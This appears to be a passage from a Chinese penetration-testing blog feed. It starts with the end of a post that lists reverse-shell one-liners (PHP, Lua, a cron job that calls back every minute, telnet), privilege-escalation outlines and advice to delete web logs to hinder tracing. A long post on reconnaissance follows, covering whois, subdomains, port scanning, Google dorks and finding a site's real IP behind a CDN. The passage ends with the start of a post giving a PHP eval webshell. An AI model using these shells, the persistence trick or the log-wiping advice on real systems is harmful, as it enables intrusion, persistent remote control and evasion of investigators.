<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure>

<p>crontab</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是</span><br><span class="line">/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>telnet</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<p><strong>linux中直接查看文件内容的工具</strong></p>
<p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
<h3 id="9-其他的一些注入问题"><a href="#9-其他的一些注入问题" class="headerlink" title="9.其他的一些注入问题"></a>9.其他的一些注入问题</h3><p>soap注入 邮件头注入 ldap注入 xpath注入 xml实体注入</p>
<h3 id="10-手工分析HTTP请求"><a href="#10-手工分析HTTP请求" class="headerlink" title="10.手工分析HTTP请求"></a>10.手工分析HTTP请求</h3><p>Burpsuite Fiddler Wireshark Tcpdump</p>
<h3 id="11-防护不严格的情况下直接用漏扫"><a href="#11-防护不严格的情况下直接用漏扫" class="headerlink" title="11.防护不严格的情况下直接用漏扫"></a>11.防护不严格的情况下直接用漏扫</h3><p>Burp WebcruiserWVS Awvs Netsparker Appcsan Owasp_zap Vega Nessus Openvas Nmap的漏洞检测脚本 Wpscan</p>
<h2 id="关于WAF对抗"><a href="#关于WAF对抗" class="headerlink" title="关于WAF对抗"></a>关于WAF对抗</h2><p>Bypass  waf分布式扫描 Bypass  waf进行注入 Bypass  waf进行上传 Bypass  waf脚本执行代码 Webshell免杀 Webshell 隐藏</p>
<h2 id="各类WEB访问日志的处理-对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。"><a href="#各类WEB访问日志的处理-对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。" class="headerlink" title="各类WEB访问日志的处理 对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。"></a>各类WEB访问日志的处理 对于WEB日志，直接删掉，主要是带有敏感特征请求的删掉，加大溯源难度。</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-提权信息收集"><a href="#1-提权信息收集" class="headerlink" title="1.提权信息收集"></a>1.提权信息收集</h3><p>1.当前机器具体跑了哪些我们可与i直接利用到的服务端口</p>
<p>2.尽可能找到目标机的所有账号密码：数据库 VPN FTP 其他第三方工具各种密码hash或明文。</p>
<p>3.当前系统装的什么杀软，防护套装是什么，有什么样的限制策略。</p>
<p>4.装了哪些可以利用的第三方工具</p>
<p>5.特殊权限的查找入suid</p>
<h3 id="2-溢出exp"><a href="#2-溢出exp" class="headerlink" title="2.溢出exp"></a>2.溢出exp</h3><p>win linux exp免杀</p>
<h3 id="3-各类数据库提权"><a href="#3-各类数据库提权" class="headerlink" title="3.各类数据库提权"></a>3.各类数据库提权</h3><p>mysql mssql oracle</p>
<h3 id="4-其他的非主流提权法"><a href="#4-其他的非主流提权法" class="headerlink" title="4.其他的非主流提权法"></a>4.其他的非主流提权法</h3><h3 id="5-dump数据-打包文件-权限维持-处理痕迹（日志）"><a href="#5-dump数据-打包文件-权限维持-处理痕迹（日志）" class="headerlink" title="5.dump数据 打包文件 权限维持 处理痕迹（日志）"></a>5.dump数据 打包文件 权限维持 处理痕迹（日志）</h3>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>泄露</tag>
        <tag>注入</tag>
        <tag>webshll</tag>
        <tag>sql</tag>
        <tag>中间件</tag>
        <tag>未授权</tag>
        <tag>包含</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB渗透测试之信息收集</title>
    <url>/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>搞渗透的人应该都清楚，给一个目标站点做测试，第一步就是信息收集，通过各种渠道和手段尽可能收集到多的关于这个站点的信息，帮助我们更多的去找到渗透点。而信息收集的方式有很多，大致有搜索引擎、域名注册网站、shodan、github信息收集工具、网站公告等等，甚至还有社工的方式。</p>
<a id="more"></a>

<h2 id="1-拿到一个待检测的站。你觉得应该先做什么。"><a href="#1-拿到一个待检测的站。你觉得应该先做什么。" class="headerlink" title="1.拿到一个待检测的站。你觉得应该先做什么。"></a>1.拿到一个待检测的站。你觉得应该先做什么。</h2><p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息。</p>
<h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><h4 id="可用信息：邮箱地址，注册人，作者信息"><a href="#可用信息：邮箱地址，注册人，作者信息" class="headerlink" title="可用信息：邮箱地址，注册人，作者信息"></a>可用信息：邮箱地址，注册人，作者信息</h4><p>​    <a href="http://www.whois.aliyun.com" target="_blank" rel="noopener">www.whois.aliyun.com</a> //阿里<br>​    <a href="http://www.whois365.com/cn/" target="_blank" rel="noopener">www.whois365.com/cn/</a> //全球查<br>​    <a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a> //站长<br>​    <a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a> //爱站</p>
<h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><pre><code>命令:whois www.xxx.com</code></pre><h3 id="2-备案查询"><a href="#2-备案查询" class="headerlink" title="2.备案查询"></a>2.备案查询</h3><h4 id="注册人姓名"><a href="#注册人姓名" class="headerlink" title="注册人姓名"></a>注册人姓名</h4><p>​    <a href="http://beianbeian.com" target="_blank" rel="noopener">http://beianbeian.com</a> //IPC备案查询<br>​    <a href="http://tianyancha.com" target="_blank" rel="noopener">http://tianyancha.com</a> //天眼查<br>​    <a href="http://beian.miit.gov.cn" target="_blank" rel="noopener">http://beian.miit.gov.cn</a> //工信部</p>
<h3 id="3-子域名收集"><a href="#3-子域名收集" class="headerlink" title="3.子域名收集"></a>3.子域名收集</h3><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><ul>
<li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">Subbrute</a> //快速枚举 DNS 记录和子域名。</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html" target="_blank" rel="noopener">Nmap</a> - 不仅仅只是端口扫描，可以使用脚本枚举子域名。使用 <code>--script dns-brute</code> 脚本。</li>
<li>谷歌语法:site:github.com</li>
<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain2</a> - 猪猪侠的作品，好用不解释。</li>
<li><a href="http://www.cnseay.com/4452/" target="_blank" rel="noopener">Layer 子域名挖掘机</a> //法师的作品，因为是用.NET写的，所以基本只能在Win下使用，也是相当好用的。</li>
</ul>
<h4 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h4><ul>
<li><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>   //站长工具</li>
<li><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a>   //证书查找</li>
<li><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>   //在线子域名爆破工具</li>
<li><a href="https://virustotal.com/" target="_blank" rel="noopener">https://virustotal.com/</a> //cdn缓存查询 也提供恶意程序分析</li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io</a> //无需多言，不仅可以看到子域名信息，还会显示对应的服务器版本及其他更多数据。</li>
</ul>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>子域名发现的原理无非就是以下几种：</p>
<ol>
<li>利用现有搜索引擎： <ul>
<li>网页搜索引擎（如：谷歌等）</li>
<li>空间搜索引擎（如：Shodan等）</li>
<li>SSL证书（如：crt.sh等），这个主要针对大站</li>
</ul>
</li>
<li>进行爆破，而爆破又分为两种： <ul>
<li>直接访问子域名</li>
<li>利用 DNS 请求</li>
</ul>
</li>
<li>其他泄露信息： <ul>
<li>如 crossdomain.xml 文件等</li>
<li>爬虫递归爬取等</li>
<li>DNS域传送漏洞等</li>
</ul>
</li>
</ol>
<h3 id="4-CMS识别"><a href="#4-CMS识别" class="headerlink" title="4.CMS识别"></a>4.CMS识别</h3><p>尽量搞明白web程序是用了什么CMS或者是用什么框架开发的<br>比如Thinkphp、Strust2。都有成熟的POC</p>
<h4 id="在线识别"><a href="#在线识别" class="headerlink" title="在线识别:"></a>在线识别:</h4><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> //识别很快python写的网站<br><a href="http://www.yunsee.cn" target="_blank" rel="noopener">www.yunsee.cn</a> //云悉</p>
<h4 id="本地识别"><a href="#本地识别" class="headerlink" title="本地识别"></a>本地识别</h4><p>御剑cms 大禹cms</p>
<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><p>whatweb url</p>
<h3 id="5-敏感目录扫描"><a href="#5-敏感目录扫描" class="headerlink" title="5.敏感目录扫描"></a>5.敏感目录扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>​    御剑、Dirmap、wwwscan、DirBuster、Dirsearch、cansina。</p>
<h4 id="kali-1"><a href="#kali-1" class="headerlink" title="kali"></a>kali</h4><p>​    dirb url //命令行使用<br>​    dirbuster     //界面化工具<br>​    wordpress:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan -u http://www.baidu.comcom  //kali扫描WordPress漏洞</span><br></pre></td></tr></table></figure>

<h3 id="6-端口"><a href="#6-端口" class="headerlink" title="6.端口"></a>6.端口</h3><h4 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h4><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anbo       //windows查看开放端口及对应进程，-a查看所有连接和侦听端口，-n以数字方式显示地址和端口号，-b显示端口连接的程序，-o显示关联pid</span><br></pre></td></tr></table></figure>
<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tunlp       // -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -a (all)列出所有服务状态-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>
<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><h5 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 &lt;目标IP&gt; //查看开放端口</span><br><span class="line">nmap &lt;目标IP&gt; -p &lt;探测端口&gt;</span><br><span class="line">masscan -p&lt;探测端口&gt; &lt;目标IP&gt; --rate=10000  //rate每秒发送的数据包</span><br></pre></td></tr></table></figure>
<h5 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/port    //站长工具</span><br></pre></td></tr></table></figure>
<h4 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21    FTP      匿名访问，弱口令</span><br><span class="line">22    SSH      弱口令登录</span><br><span class="line">23    Telnet   弱口令登录</span><br><span class="line">80    Web      常见Web漏洞或后台登录弱口令</span><br><span class="line">161   SNMP     public弱口令</span><br><span class="line">389   LDAP     匿名访问</span><br><span class="line">443   openssl  心脏滴血等</span><br><span class="line">445   smb      操作系统溢出漏洞</span><br><span class="line">873   rsync    匿名访问，弱口令</span><br><span class="line">1099  JAVArmi  命令执行</span><br><span class="line">1433  MsSQL    弱口令</span><br><span class="line">1521  Oracle   弱口令</span><br><span class="line">2601  Zebra    默认密码zebra</span><br><span class="line">3128  squid    匿名访问（可能内网漫游）</span><br><span class="line">3306  MySQL    弱口令</span><br><span class="line">3389  RDP      远程桌面弱口令</span><br><span class="line">4440  Rundeck          弱口令admin</span><br><span class="line">4848  GlassFish        弱口令admin/adminadmin</span><br><span class="line">5432  PostGreSQL       弱口令爆破</span><br><span class="line">6379  Redis            匿名访问</span><br><span class="line">7001,7002   Weblogic         弱口令爆破</span><br><span class="line">8080        Tomcat\Jboss     弱口令，Jboss匿名访问</span><br><span class="line">8080-8090   常见Web端口</span><br><span class="line">9043        WebSphere        弱口令爆破</span><br><span class="line">27017       MongoDB          未授权访问</span><br></pre></td></tr></table></figure>

<h3 id="7-敏感信息收集"><a href="#7-敏感信息收集" class="headerlink" title="7.敏感信息收集"></a>7.敏感信息收集</h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype: 搜索制定类型的文件，例如：filetype:doc.将返回所有以doc结尾的文件URL。</span><br><span class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件。例如在google里输入:intext:Melon.将返回所有在网页正文部分包含”Melon”的网页。</span><br><span class="line">intitle: 搜索网页标题中是否有我们所要找的字符。allintitle:也同intitle类似。</span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候往往能找到一些好东西。</span><br><span class="line">info: 查找指定站点的一些基本信息。</span><br><span class="line">inurl: 搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接:http://xxx/admin,常用于查找通用漏洞、注入点、管理员登录的URL。</span><br><span class="line">allinurl:也同inurl类似,可指定多个字符</span><br><span class="line">linkurl: 例如搜索:linkurl:melons.top可以返回所有和melons.top做了链接的URL。</span><br><span class="line">site: 搜索指定域名,如site:melons.top.将返回所有和melons.top有关的URL。</span><br></pre></td></tr></table></figure>
<h4 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h4><p>F12查看系统，中间件版本。</p>
<h4 id="通过Github搜索获取敏感信息"><a href="#通过Github搜索获取敏感信息" class="headerlink" title="通过Github搜索获取敏感信息"></a>通过Github搜索获取敏感信息</h4><p>site:Github password</p>
<h3 id="8-真实IP"><a href="#8-真实IP" class="headerlink" title="8.真实IP"></a>8.真实IP</h3><p><strong>IP查询</strong><br><a href="https://www.ipip.net" target="_blank" rel="noopener">https://www.ipip.net</a>       查询该ip的具体信息<br><a href="https://site.ip138.com" target="_blank" rel="noopener">https://site.ip138.com</a>    ip反查域名/域名对应ip<br><a href="http://www.cip.cc/" target="_blank" rel="noopener">http://www.cip.cc/</a>          本机ip/其他ip简单信息</p>
<p><strong>判断是否为CDN</strong></p>
<h4 id="1、多地ping"><a href="#1、多地ping" class="headerlink" title="1、多地ping"></a>1、多地ping</h4><p>如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DnsPing.png" alt="html">    </p>
<h4 id="2、nslookup"><a href="#2、nslookup" class="headerlink" title="2、nslookup"></a>2、nslookup</h4><p>使用nslookup查看域名解析对应的IP地址，如果解析到多个IP地址则说明使用了CDN~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nslookup.png" alt="html"><br>从上面可以看到解析到多个IP地址说明使用了CDN~</p>
<h4 id="3、使用CDN查询工具进行查看"><a href="#3、使用CDN查询工具进行查看" class="headerlink" title="3、使用CDN查询工具进行查看"></a>3、使用CDN查询工具进行查看</h4><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a> //高精度IP查询<br><strong>绕CDN查真实IP地址</strong></p>
<h4 id="1、域名历史解析记录"><a href="#1、域名历史解析记录" class="headerlink" title="1、域名历史解析记录"></a>1、域名历史解析记录</h4><p>查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>

<h4 id="2、查询子域名"><a href="#2、查询子域名" class="headerlink" title="2、查询子域名"></a>2、查询子域名</h4><p>很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。</p>
<h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p>目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpinfo.png" alt="html"><br>XSS盲打，命令执行反弹shell，SSRF等。<br>无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h4 id="4、网站邮件订阅查找"><a href="#4、网站邮件订阅查找" class="headerlink" title="4、网站邮件订阅查找"></a>4、网站邮件订阅查找</h4><p>让服务器主动连接我们告诉我们它的IP，不过使用的是合法的服务，如RSS邮件订阅，很多网站都自带sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="5、使用国外主机解析域名"><a href="#5、使用国外主机解析域名" class="headerlink" title="5、使用国外主机解析域名"></a>5、使用国外主机解析域名</h4><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h4 id="6、网络空间引擎搜索法"><a href="#6、网络空间引擎搜索法" class="headerlink" title="6、网络空间引擎搜索法"></a>6、网络空间引擎搜索法</h4><p>常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</p>
<h4 id="7、F5-LTM解码法"><a href="#7、F5-LTM解码法" class="headerlink" title="7、F5 LTM解码法"></a>7、F5 LTM解码法</h4><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<h4 id="8、利用网站返回的内容寻找真实原始IP"><a href="#8、利用网站返回的内容寻找真实原始IP" class="headerlink" title="8、利用网站返回的内容寻找真实原始IP"></a>8、利用网站返回的内容寻找真实原始IP</h4><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。<br>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<h4 id="9、利用SSL证书寻找真实原始IP"><a href="#9、利用SSL证书寻找真实原始IP" class="headerlink" title="9、利用SSL证书寻找真实原始IP"></a>9、利用SSL证书寻找真实原始IP</h4><p>以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。<br>为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443(<a href="https://x.x.x.x:443" target="_blank" rel="noopener">https://x.x.x.x:443</a>) 上直接连接到IP时，SSL证书就会被暴露。<br>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。<br>目前Censys工具(<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a>) 就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。<br>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。<br>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。<br>Censys证书查询搜索步骤如下：</p>
<h5 id="1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com"><a href="#1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com" class="headerlink" title="1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com"></a>1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com</h5><p>只显示有效证书的查询参数为：tags.raw：trusted<br>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<h5 id="2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted"><a href="#2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted" class="headerlink" title="2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted"></a>2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted</h5><h5 id="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；"><a href="#3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；" class="headerlink" title="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；"></a>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</h5><h4 id="10、通过shodan-favicon-ico获取真实IP"><a href="#10、通过shodan-favicon-ico获取真实IP" class="headerlink" title="10、通过shodan favicon.ico获取真实IP"></a>10、通过shodan favicon.ico获取真实IP</h4><p>在Shodan搜索中有一个关于网站icon图标的搜索语法，<strong>http.favicon.hash</strong>，我们可以使用这个语法来搜索出使用了同一icon图标的网站。(其实这种方法是看运气的，如果shodan中收录了目标网站则可以查到)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/favicon.ico'</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">'base64'</span>)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line"><span class="keyword">print</span> hash</span><br></pre></td></tr></table></figure>
<p>计算出的hash用 http.favicon.hash：hash 搜索</p>
<h3 id="9-shodan"><a href="#9-shodan" class="headerlink" title="9.shodan"></a>9.shodan</h3><p>shodan网站：<a href="http://www.shodan.io" target="_blank" rel="noopener">www.shodan.io</a><br>webcam //网络摄像头<br>搜索技巧：<br>   搜索指定端口：port:3389<br>   搜索指定IP地址：host:61.135.169.121<br>   搜索具体城市开放具体端口：city:hangzhou port:22<br>   搜索指定服务器：microsoft iis 6.0 / apache<br>kali：<br>   获取自身外部ip：myip<br>   查询指定IP：host xxxx (网页版可能不会显示)<br>   查看蜜罐保护：shodan honeyscore xxxx<br>python-shodan：<br>   初始化api key<br>   python-shodan search 方法：</p>
<ul>
<li>result = api.search(‘apache’)</li>
<li>print(result[‘total’])</li>
<li>查看api键值：<a href="https://developer.shodan.io/api" target="_blank" rel="noopener">https://developer.shodan.io/api</a></li>
<li>python-shodan查找ip：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用 Shodan 库函数</span><br><span class="line">shodan.Shodan(key) ：初始化连接API</span><br><span class="line">Shodan.count(query, facets=None)：返回查询结果数量</span><br><span class="line">Shodan.host(ip, history=False)：返回一个IP的详细信息</span><br><span class="line">Shodan.ports()：返回Shodan可查询的端口号</span><br><span class="line">Shodan.protocols()：返回Shodan可查询的协议</span><br><span class="line">Shodan.services()：返回Shodan可查询的服务</span><br><span class="line">Shodan.queries(page=1, sort=&apos;timestamp&apos;, order=&apos;desc&apos;)：查询其他用户分享的查询规则</span><br><span class="line">Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</span><br><span class="line">Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</span><br></pre></td></tr></table></figure>

<h3 id="10-旁站"><a href="#10-旁站" class="headerlink" title="10.旁站"></a>10.旁站</h3><p>看看网站有没有旁站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a> //查询IP 查询旁站<br>对旁站进行信息收集 为下面的以后的漏洞挖掘做准备。</p>
<h3 id="11-判断系统版本"><a href="#11-判断系统版本" class="headerlink" title="11.判断系统版本"></a>11.判断系统版本</h3><p>最快速的就是利用Windows和Linux的对大小写敏感来判断<br>Windows对大小写不敏感 Linux对大小写敏感<br>利用TTL起始值判断操作系统,不同类型的操作系统都有默认的TTL值<br>TTL起始值:Windows xp(及在此版本之前的windows) 128 (广域网中TTL为65-128)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Windows.png" alt="html"><br>Linux/Unix64(广域网中TTL为1-64)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Linux.png" alt="html"><br>某些Unix:255，网关:255<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Gateway.png" alt="html"><br>使用nmap识别操作系统:nmap -O 192.168.0.1 #参数-O表示扫描操作系统信息,nmap基于签名,指纹,特征,CPE编号等方法去判断目标系统的信息 。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nmapO.png" alt="html"></p>
<h3 id="11-目标用的是哪种web服务器-具体版本号是多少"><a href="#11-目标用的是哪种web服务器-具体版本号是多少" class="headerlink" title="11.目标用的是哪种web服务器 具体版本号是多少"></a>11.目标用的是哪种web服务器 具体版本号是多少</h3><p>首先手工测试目标web服务器是否允许一些危险请求的方法：put move options<br>Apach 2.2.x/2.4.x<br>Nginx<br>IIS 6.x/7.x/8.x 尝试webdav写及远程执行<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">CVE-2017-7269</a> 尝试短文件漏洞目录文件扫描<br>Tomcat 6.x/7.x/8.x 曾经出现的远程命令执行多 默认的管理面板 弱口令 部署war包<br>Jboss 未授权访问进入JBoss后台进行文件上传的漏洞，例如：CVE-2007-1036，CVE-2010-0738,CVE-2005-5750 Java反序列化进行远程代码执行的漏洞，例如：CVE-2015-7501，CVE-2017-7504，CVE-2017-12149，CVE-2013-4810。 还有一种 JBoss seam2的模板注入CVE-2010-1871漏洞。<br>Resin<br> 是否是集成环境 XAMPP LNMP</p>
<h3 id="12-目标站有没有WAF"><a href="#12-目标站有没有WAF" class="headerlink" title="12.目标站有没有WAF"></a>12.目标站有没有WAF</h3><p> 有没有WAF，是什么类型的WAF 加入敏感特征看看会不会拦截 FUZZ测试</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title>JsWebshell</title>
    <url>/2019/12/11/JSshell/</url>
    <content><![CDATA[<p>在目标站有可写的html点时可以使用</p>
<a id="more"></a>

<h3 id="0x00-准备环境"><a href="#0x00-准备环境" class="headerlink" title="0x00 准备环境"></a>0x00 准备环境</h3><p>环境使用的是：PHP Version 5.6.27+Apach</p>
<h3 id="0x01-开始实验"><a href="#0x01-开始实验" class="headerlink" title="0x01 开始实验"></a>0x01 开始实验</h3><p>准备的代码为（这里用的虽然是js其实最后还是用了php）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@eval($_POST[&apos;web&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在这里我们先用纯Html做一次测试</p>
<p><img src="/images/JSshell/html.png" alt="html"></p>
<p>我们访问html页面发现并没有任何反应</p>
